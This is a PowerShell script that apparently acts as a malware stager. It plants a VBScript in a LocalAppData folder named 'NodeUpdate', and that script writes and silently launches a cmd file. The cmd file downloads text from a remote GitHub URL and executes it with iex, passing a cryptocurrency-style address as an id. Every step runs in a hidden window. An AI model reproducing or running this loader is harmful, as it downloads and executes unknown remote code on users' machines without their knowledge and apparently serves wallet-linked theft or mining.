param(
    [string]$id='0xB9F8e457Cd0E97f0CF7aEd57D0654F1Ad61759C1'
)

$localAppData = [Environment]::GetFolderPath('LocalApplicationData')
$targetDir    = Join-Path $localAppData "NodeUpdate"
$vbsPath      = Join-Path $targetDir "install.vbs"

if (-not (Test-Path -Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir | Out-Null
}
$vbsContent = @"
Set fso = CreateObject("Scripting.FileSystemObject")
path = "test.cmd"

Set file = fso.CreateTextFile(path, True)
file.WriteLine "powershell -command ""`$asd=(iwr 'https://raw.githubusercontent.com/1CodeDev-hub/electronAI/refs/heads/main/new.txt' -UseBasicParsing ).Content; iex """"& { `$asd } -id '$id'"""""""
file.Close

Set sh = CreateObject("Shell.Application")
sh.ShellExecute path, "", "", "open", 0
"@
Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
Start-Process -FilePath $vbsPath -WindowStyle Hidden
